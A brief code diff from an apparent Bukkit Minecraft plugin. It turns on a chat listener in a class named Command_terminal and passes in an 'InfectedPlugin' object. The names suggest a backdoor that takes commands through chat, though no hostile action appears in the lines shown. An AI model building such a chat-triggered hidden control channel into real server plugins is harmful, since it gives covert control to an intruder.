@@ -6,14 +6,20 @@ import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
-import org.bukkit.event.Listener;
+import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_terminal implements Listener
 {
+    private InfectedPlugin plugin;
+
+    public Command_terminal(InfectedPlugin plugin) {
+        this.plugin = plugin;
+    }
+
+    @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
-        InfectedPlugin plugin = null;
         String message = event.getMessage();
         String[] args = message.split(" ");
         final Player p = event.getPlayer();
